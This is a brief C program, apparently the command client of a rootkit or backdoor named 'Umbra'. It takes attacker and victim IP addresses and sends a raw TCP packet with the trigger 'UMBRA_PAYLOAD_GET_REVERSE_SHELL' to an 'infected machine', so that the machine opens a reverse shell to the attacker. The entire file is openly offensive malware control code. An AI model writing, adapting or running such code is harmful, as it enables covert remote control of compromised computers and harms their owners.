#include "lib/RawTCP.h"
#include <stdio.h>

void main(int argc, char* argv[]){
    if(argc<3){
        printf("Invalid number of arguments\n");
        printf("Usage: client <attacker_ip_address>, <victim_ip_address>\n");
        return;
    }
    packet_t packet = build_standard_packet(9000, 9000, argv[1], argv[2], 2048, "UMBRA_PAYLOAD_GET_REVERSE_SHELL");
    printf("Sending malicious packet to infected machine...\n");
    if(rawsocket_send(packet)<0){
        printf("An error occured. Is the machine up?\n");
    }else{
        printf("Finished!\n");
    }
    

   
}